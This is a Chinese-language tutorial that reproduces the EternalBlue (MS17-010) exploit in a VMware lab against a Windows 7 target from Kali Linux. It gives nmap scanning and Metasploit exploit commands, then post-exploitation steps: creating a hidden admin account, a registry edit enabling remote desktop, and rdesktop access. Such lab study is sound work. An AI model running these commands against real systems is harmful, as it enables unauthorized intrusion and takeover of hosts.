永恒之蓝漏洞复现

简介

永恒之蓝（英语：EternalBlue)是美国国家安全局开发的漏洞利用程序, 于2017年4月14日被黑客组织影子掮客泄漏. 该工具利用445/TCP端口的档案分享协议的漏洞进行散播. (来源: 维基百科)

本文档旨在依托网上s他人经验, 在虚拟机上实现永恒之蓝的复现工作, 以了解其攻击的原理和过程, 仅作学习和参考.

原理

EternalBlue

微软SMB协议错误处理远程攻击者的特质数据包, 因而允许远程攻击者在目标主机上远程执行代码, 控制主机. SMB协议通过端口139和445运行, 而445端口是一种TCP端口, 是一个共享的文件夹和打印机的端口，提供局域网中文件或打印机共享服务.

永恒之蓝利用这个漏洞, 可以轻松地获取系统的最高权限, 并利用开放的445端口, 远程将勒索软件植入目标主机, 从而勒索对方.

nmap

nmap可以用于寻找活跃主机, 扫描其端口是否开启

metasploit

metasploit是一个渗透框架, 可以搜索目标模块, 利用模块, 设置参数, 最后进行攻击. 其中也有很多

msfconsole则提供了一个一体化的控制平台, 可以访问metasploit的插件, 我们可以直接利用msfconsole进行以上功能的实现.

复现过程

搭建环境

配置

虚拟机: VMware Workstation 16 Pro

靶机: Windows 7 企业版 x86

攻击机: Kali Linux 2022

配置过程

靶机

  • 打开VMware Workstation-文件-新建虚拟机-典型-稍后安装操作系统-版本选择Windows 7-选择虚拟机的名称和位置

  • 编辑虚拟机设置-CD/DVD(SATA)-使用ISO映像文件-选择镜像安装的地方-确定-开启虚拟机

    随后按照步骤安装windows即可

攻击机

  • 下载kali linux 链接

    Get Kali | Kali Linux

    本次我选择的是kali-linux-2022.1-vmware-amd64.vmx

    直接从VMware Workstation 打开即可

  • 第一次打开时需要输入用户名和密码，默认用户名和密码都是kali

    安装成功后是如下界面

攻击过程

查询靶机IP地址

打开windows 7的cmd, 输入ipconfig

![Y@ZS`_FLB__G3@__C4X_5VV.png](https://s2.loli.net/2022/05/14/2KEz6PyYLRiGwBu.png)

图中IPv4地址192.168.148.128即为靶机IP地址

使用nmap

  • 打开powershell, 输入nmap <靶机ip地址>

  • 此时显示Host seems down.于是我们转到windows 7靶机上将其防火墙关闭(便于复现).

    ![Q_5Y_ZVC`BEB~HL@9F48QAP.png](https://s2.loli.net/2022/05/14/Rw3hy4G1e7CSLYv.png)

    点击左侧’打开或关闭Windows防火墙‘

  • 然后我们重复第一步, 再次在kali中使用nmap

    此时我们观察到其中445端口处于开启状态即可

使用metasploit

  • 在kali linux中打开powershell, 输入msfconsole

    ![7EMAV_P`22LX_B_C2_TPDOE.png](https://s2.loli.net/2022/05/14/VjCtDTesOFM84ku.png)

  • 远程控制靶机

    搜索metasploit中的ms17-010模块 search ms 17_010

    随后利用该模块 use exploit/windows/smb/ms17_010_eternalblue

    set rhost <靶机ip地址>

    run

  • 输入shell

    可以发现我们已经进入到靶机的shell里了, 那么现在就可以任意控制靶机了

开启远程桌面

  • 创建新的用户 net user <username> <password> /add

    赋予新用户管理员权限 net localgroup administrators <username> /add

    ![_ML_GVPI`P_O7_AFCW__N_A.png](https://s2.loli.net/2022/05/14/1aYS4cOB2NjUmek.png)

  • 打开3389端口 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

  • 在kali上新打开一个终端, 并远程桌面 rdesktop <靶机ip地址>

    选择其他用户-输入刚刚新建的用户及密码

    这样我们就可以开启远程桌面了, 到此, 漏洞复现工作结束.
